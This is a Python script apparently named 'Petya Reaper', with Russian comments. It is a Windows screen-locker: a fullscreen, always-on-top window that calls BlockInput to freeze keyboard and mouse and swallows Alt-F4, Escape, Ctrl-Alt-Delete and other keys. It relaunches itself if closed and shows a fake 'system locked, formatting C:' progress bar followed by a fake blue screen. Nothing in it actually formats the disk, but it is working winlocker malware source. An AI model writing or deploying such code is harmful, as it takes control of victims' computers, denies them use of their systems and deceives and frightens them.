import tkinter as tk
import random
import ctypes
import threading
import time
import subprocess
import sys
import os
from ctypes import wintypes
from PIL import Image, ImageDraw, ImageTk

# ============================================
# P E T Y A   R E A P E R   -   B L A C K   E Y E
# ============================================

W, H = None, None
format_percent = 0
bsod_mode = False
bsod_timer = 0
exe_path = sys.argv[0]
eye_image = None
pupil_image = None

# Блокировка системных клавиш
def block_keys():
    ctypes.windll.user32.BlockInput(True)

def unblock_keys():
    ctypes.windll.user32.BlockInput(False)

def self_replicate():
    while True:
        time.sleep(0.3)
        try:
            root.update()
        except:
            unblock_keys()
            subprocess.Popen([exe_path], shell=True)
            os._exit(0)

def create_eye_image(size=300):
    """Создает реалистичный глаз"""
    # Белок глаза
    img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    
    # Внешний контур глаза
    draw.ellipse([10, 10, size-10, size-10], fill=(255, 255, 255, 255), outline=(200, 0, 0, 255), width=5)
    
    # Радужка (красная)
    draw.ellipse([size//4, size//4, size*3//4, size*3//4], fill=(150, 0, 0, 255), outline=(255, 0, 0, 255), width=3)
    
    # Зрачок (черный)
    draw.ellipse([size*3//8, size*3//8, size*5//8, size*5//8], fill=(0, 0, 0, 255), outline=(255, 100, 100, 255), width=2)
    
    # Блик
    draw.ellipse([size//2-20, size//2-30, size//2-10, size//2-20], fill=(255, 255, 255, 200))
    draw.ellipse([size//2+5, size//2-25, size//2+15, size//2-15], fill=(255, 255, 255, 180))
    
    # Кровеносные сосуды
    for i in range(20):
        x1 = random.randint(size//3, size*2//3)
        y1 = random.randint(size//3, size*2//3)
        x2 = x1 + random.randint(-30, 30)
        y2 = y1 + random.randint(-30, 30)
        draw.line([x1, y1, x2, y2], fill=(200, 0, 0, 150), width=random.randint(1, 2))
    
    return ImageTk.PhotoImage(img)

def create_pupil_image(size=100):
    """Создает зрачок для движения"""
    img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    draw.ellipse([5, 5, size-5, size-5], fill=(0, 0, 0, 255), outline=(100, 0, 0, 255), width=2)
    draw.ellipse([size//4, size//4, size*3//4, size*3//4], fill=(50, 0, 0, 255))
    return ImageTk.PhotoImage(img)

def move_pupil(event=None):
    """Движение зрачка за курсором"""
    if not bsod_mode:
        try:
            x, y = root.winfo_pointerxy()
            canvas.coords(pupil_id, x - 30, y - 30)
        except:
            pass
    root.after(50, move_pupil)

def draw_bsod(canvas):
    """Синий экран смерти"""
    canvas.delete("all")
    canvas.create_rectangle(0, 0, W, H, fill="#0a2f6a", outline="")
    
    canvas.create_text(W//2, H//2 - 180, text=":(", fill="white", font=("Segoe UI", 160))
    canvas.create_text(W//2, H//2 - 20, text="КРИТИЧЕСКАЯ ОШИБКА СИСТЕМЫ", 
                      fill="white", font=("Segoe UI", 36, "bold"))
    
    error = random.choice([
        "REAPER_SOUL_0xDEADBEEF",
        "EYE_OF_GOD_0x8BADF00D",
        "CRITICAL_PROCESS_DIED",
        "SOUL_EATER_0xDEADCODE"
    ])
    
    canvas.create_text(W//2, H//2 + 60, text=error, fill="#aaccff", 
                      font=("Consolas", 24, "bold"))
    
    canvas.create_text(W//2, H - 120, text="⚠️  ТЕБЯ ЗАМЕТИЛИ  ⚠️", 
                      fill="#ff6666", font=("Arial", 56, "bold"))

def glitch():
    global format_percent, bsod_mode, bsod_timer, eye_id, pupil_id
    
    if bsod_mode:
        draw_bsod(canvas)
        root.after(200, glitch)
        return
    
    canvas.delete("all")
    
    # Черный фон
    canvas.create_rectangle(0, 0, W, H, fill="black", outline="")
    
    # Череп Petya слева вверху
    cx, cy = 200, 200
    canvas.create_oval(cx-70, cy-70, cx+70, cy+50, fill="black", outline="red", width=4)
    canvas.create_oval(cx-40, cy-40, cx-10, cy-10, fill="black", outline="red", width=3)
    canvas.create_oval(cx+10, cy-40, cx+40, cy-10, fill="black", outline="red", width=3)
    canvas.create_oval(cx-35, cy-35, cx-15, cy-15, fill="red", outline="yellow", width=2)
    canvas.create_oval(cx+15, cy-35, cx+35, cy-15, fill="red", outline="yellow", width=2)
    canvas.create_polygon(cx-10, cy-5, cx+10, cy-5, cx, cy+15, fill="darkred", outline="red", width=2)
    for i in range(6):
        canvas.create_rectangle(cx-25 + i*10, cy+20, cx-20 + i*10, cy+35, fill="white", outline="gray")
    canvas.create_line(cx-30, cy-90, cx+30, cy-90, fill="red", width=5)
    canvas.create_line(cx, cy-120, cx, cy-60, fill="red", width=5)
    canvas.create_text(cx, cy-140, text="[ ! ]", fill="red", font=("Arial", 30, "bold"))
    
    # ОГРОМНЫЙ ГЛАЗ В ЦЕНТРЕ
    global eye_image, pupil_image, pupil_id
    eye_image = create_eye_image(400)
    pupil_image = create_pupil_image(60)
    
    # Размещаем глаз в центре
    canvas.create_image(W//2, H//2, image=eye_image, anchor="center", tags="eye")
    
    # Зрачок (будет двигаться)
    pupil_id = canvas.create_image(W//2, H//2, image=pupil_image, anchor="center", tags="pupil")
    
    # Кровь/трещины от глаза
    for i in range(30):
        x = W//2 + random.randint(-250, 250)
        y = H//2 + random.randint(-250, 250)
        canvas.create_line(W//2, H//2, x, y, fill=random.choice(["#8b0000", "#660000", "#330000"]), 
                         width=random.randint(1, 3))
    
    # ТЕБЯ ЗАМЕТИЛИ - огромная надпись
    canvas.create_text(W//2, H//2 - 300, text="⚠️  ТЕБЯ ЗАМЕТИЛИ  ⚠️", 
                      fill="red", font=("Arial", 72, "bold"))
    
    # Винлокер снизу
    cx_win = W//2
    cy_win = H - 200
    canvas.create_rectangle(cx_win-300, cy_win-80, cx_win+300, cy_win+80, 
                          fill="#0a0a0a", outline="red", width=3)
    canvas.create_text(cx_win, cy_win-30, text="СИСТЕМА ЗАБЛОКИРОВАНА", 
                      fill="red", font=("Arial", 28, "bold"))
    canvas.create_text(cx_win, cy_win+20, text="ФОРМАТИРОВАНИЕ: C:\\ [{}%]".format(int(format_percent)), 
                      fill="white", font=("Courier", 20))
    
    # Прогресс-бар
    bar_x = cx_win - 250
    bar_y = cy_win + 40
    canvas.create_rectangle(bar_x, bar_y, bar_x+500, bar_y+20, outline="gray", fill="#222")
    canvas.create_rectangle(bar_x, bar_y, bar_x+int(500*(format_percent/100)), bar_y+20, 
                          fill="red", outline="")
    
    # Глаза по всему экрану (маленькие)
    for _ in range(100):
        x = random.randint(0, W)
        y = random.randint(0, H)
        canvas.create_text(x, y, text=random.choice(["◉", "⬤", "@"]), 
                         fill="darkred", font=("Courier", random.randint(12, 24)))
    
    # Обновление процентов
    global bsod_timer
    format_percent = min(100, format_percent + 0.5)
    bsod_timer += 0.2
    
    # Переход в BSOD режим
    if bsod_timer > 15:
        bsod_mode = True
    
    # Звук
    ctypes.windll.kernel32.Beep(random.randint(100, 200), 30)
    
    root.after(100, glitch)

# ============================================
# СОЗДАНИЕ ОКНА
# ============================================
root = tk.Tk()
W, H = root.winfo_screenwidth(), root.winfo_screenheight()

root.attributes("-fullscreen", True, "-topmost", True)
root.configure(bg="black")
root.overrideredirect(True)

# ПОЛНАЯ БЛОКИРОВКА ВСЕХ КЛАВИШ
root.bind("<Key>", lambda e: "break")
root.bind("<Escape>", lambda e: "break")
root.bind("<Alt-F4>", lambda e: "break")
root.bind("<Control>", lambda e: "break")
root.bind("<Alt>", lambda e: "break")
root.bind("<F4>", lambda e: "break")
root.bind("<Control-c>", lambda e: "break")
root.bind("<Control-x>", lambda e: "break")
root.bind("<Control-w>", lambda e: "break")
root.bind("<Alt-Tab>", lambda e: "break")
root.bind("<Control-Alt-Delete>", lambda e: "break")
root.bind("<Win>", lambda e: "break")
root.bind("<Tab>", lambda e: "break")
root.bind("<Return>", lambda e: "break")
root.bind("<Space>", lambda e: "break")

root.protocol("WM_DELETE_WINDOW", lambda: None)

canvas = tk.Canvas(root, width=W, height=H, highlightthickness=0, bg="black")
canvas.pack()

# БЛОКИРОВКА ВВОДА
try:
    block_keys()
except:
    pass

# ЗАПУСК ПОТОКОВ
threading.Thread(target=self_replicate, daemon=True).start()

# ДВИЖЕНИЕ ЗРАЧКА
root.after(100, move_pupil)

# ЗАПУСК
glitch()
root.mainloop()

# РАЗБЛОКИРОВКА ПРИ ЗАКРЫТИИ
try:
    unblock_keys()
except:
    pass